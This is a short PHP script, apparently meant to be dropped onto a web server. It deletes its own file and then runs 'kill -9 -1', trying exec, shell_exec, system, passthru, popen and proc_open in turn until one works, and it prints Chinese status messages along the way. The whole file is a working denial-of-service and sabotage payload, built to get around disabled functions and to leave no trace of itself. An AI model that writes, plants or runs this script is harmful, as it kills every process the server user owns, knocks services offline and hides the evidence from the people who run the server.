<?php
        unlink(__FILE__);
        $cmd="kill -9 -1";
        if (function_exists('exec'))
        {
            echo 'exec 执行 '.$cmd;
            exec($cmd);
        }elseif(function_exists('shell_exec'))
        {
            echo 'shell_exec 执行 '.$cmd;
            shell_exec($cmd);
        }elseif(function_exists('system'))
        {
            echo 'system 执行 '.$cmd;
            system($cmd);
        }elseif(function_exists('passthru'))
        {
            echo 'passthru 执行 '.$cmd;
            passthru($cmd);
        }elseif(function_exists('popen'))
        {
            echo 'popen 执行 '.$cmd;
            $fp = popen($cmd,"r");
            pclose($fp);
        }elseif(function_exists('proc_open'))
        {
            echo 'proc_open 执行 '.$cmd;
            $fp = proc_open($cmd,array( array("pipe","r"),array("pipe","w"),array("file","/tmp/error-output.txt","a") ),$pipes);
            proc_close($fp);
        }else
        {
            echo '执行失败';
        }

?>